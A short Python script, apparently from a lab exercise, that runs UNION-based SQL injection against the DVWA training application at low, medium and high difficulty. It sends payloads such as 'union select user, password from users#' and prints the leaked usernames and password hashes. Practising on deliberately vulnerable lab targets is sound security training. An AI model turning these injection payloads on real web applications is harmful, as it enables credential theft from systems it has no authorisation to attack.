"""
    SQL injection in DVWA    
"""

import requests
import os
import sys
sys.path.insert(0,'../') # To import dvwa module
import dvwa
from bs4 import BeautifulSoup
"""
pip install bs4
pip install lxml
"""

def exploit_low(sess, sql_query="select user, password from users#"):
    exploit = "'union "
    exploit += sql_query
    payload = {    
        "id":exploit,
        "Submit":"Submit"
    }
    resp = sess.get("http://192.168.1.73/dvwa/vulnerabilities/sqli/", params=payload)
    #print(resp.text)
    soup = BeautifulSoup(resp.text, 'lxml')
    tags = soup.findAll('pre')
    for each in tags:
        print(each)
def exploit_med(sess, sql_query="select user, password from users#"):
    exploit = "1 or 1=1 union "
    exploit += sql_query
    payload = {
        "id":exploit,
        "Submit":"Submit"
    }
    resp = sess.post("http://192.168.1.73/dvwa/vulnerabilities/sqli/", data=payload)
    #print(resp.text)
    soup = BeautifulSoup(resp.text, 'lxml')
    tags = soup.findAll('pre')
    
    for each in tags:
        print("[leak] : "+str(each))
def generate_exploit_high(sess, sql_query="select user, password from users#"):
    exploit = "1' union "
    exploit += sql_query
    return exploit

def main():
    sess = requests.Session()
    sess = dvwa.login_dvwa(sess, "http://192.168.1.73/dvwa/login.php")
    sess = dvwa.set_dvwa_difficulty(sess, "http://192.168.1.73/dvwa/security.php", "high")
    
    #exploit_low(sess)
    #exploit_med(sess)

    print(generate_exploit_high(sess))
    
main()